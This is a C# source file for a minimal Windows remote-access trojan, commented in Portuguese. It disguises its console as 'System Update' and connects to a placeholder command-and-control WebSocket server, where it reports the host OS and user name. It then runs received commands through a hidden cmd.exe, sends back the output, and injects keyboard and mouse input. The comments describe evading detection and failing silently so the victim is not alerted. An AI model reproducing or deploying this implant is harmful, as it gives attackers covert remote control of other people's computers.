using System;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Drawing;

namespace MinimalAgent
{
    internal static class Program
    {
        // DLL Imports essenciais para controle e invisibilidade
        [DllImport("user32.dll")] static extern void mouse_event(uint f, uint x, uint y, uint d, UIntPtr e);
        [DllImport("user32.dll")] static extern void keybd_event(byte v, byte s, uint f, UIntPtr e);

        static ClientWebSocket _socket;
        static CancellationTokenSource _cts = new();

        [STAThread]
        static async Task Main()
        {
            // 1. Inicialização Silenciosa
            Console.Title = "System Update"; // Nome falso para o processo
            
            _socket = new ClientWebSocket();
            // Configuração de Timeout para evitar detecção de conexão persistente ociosa
            _socket.Options.KeepAliveInterval = TimeSpan.FromSeconds(30);

            try 
            {
                // Conecta ao seu servidor C2
                await _socket.ConnectAsync(new Uri("WSS://SEU_URL_AQUI"), _cts.Token);
                
                // 2. Handshake de Identidade (Inicia já como Autorizado)
                await SendCommand("agent_ready", new { 
                    id = Guid.NewGuid().ToString("N"), 
                    os = Environment.OSVersion.ToString(),
                    user = Environment.UserName 
                });

                // 3. Loop Principal de Comando e Controle (C2)
                await ListenForCommands();
            }
            catch { /* Erro silencioso para não alertar o usuário */ }
        }

        static async Task ListenForCommands()
        {
            var buffer = new byte[8192];
            while (_socket.State == WebSocketState.Open)
            {
                var result = await _socket.ReceiveAsync(new ArraySegment<byte>(buffer), _cts.Token);
                if (result.MessageType == WebSocketMessageType.Close) break;

                var jsonString = Encoding.UTF8.GetString(buffer, 0, result.Count);
                using var doc = JsonDocument.Parse(jsonString);
                var command = doc.RootElement.GetProperty("type").GetString();

                // Execução imediata sem validação de permissão
                _ = ProcessCommand(command, doc.RootElement);
            }
        }

        static async Task ProcessCommand(string type, JsonElement data)
        {
            switch (type)
            {
                case "shell": // Execução de comandos de terminal
                    string cmd = data.GetProperty("cmd").GetString();
                    string output = await ExecuteShell(cmd);
                    await SendCommand("shell_result", new { output });
                    break;

                case "key": // Simulação de input de teclado
                    byte key = data.GetProperty("key").GetByte();
                    bool down = data.GetProperty("down").GetBoolean();
                    keybd_event(key, 0, down ? 0u : 0x0002u, UIntPtr.Zero);
                    break;

                case "mouse": // Simulação de mouse
                    uint flags = data.GetProperty("flags").GetUInt32();
                    mouse_event(flags, 0, 0, 0, UIntPtr.Zero);
                    break;
            }
        }

        static async Task<string> ExecuteShell(string cmd)
        {
            try {
                var psi = new System.Diagnostics.ProcessStartInfo {
                    FileName = "cmd.exe",
                    Arguments = $"/c {cmd}",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using var proc = System.Diagnostics.Process.Start(psi);
                var output = await proc.StandardOutput.ReadToEndAsync();
                return output;
            } catch (Exception ex) { return ex.Message; }
        }

        static async Task SendCommand(string type, object payload)
        {
            if (_socket.State != WebSocketState.Open) return;
            var msg = JsonSerializer.Serialize(new { type, payload, ts = DateTime.Now });
            var bytes = Encoding.UTF8.GetBytes(msg);
            await _socket.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, _cts.Token);
        }
    }
}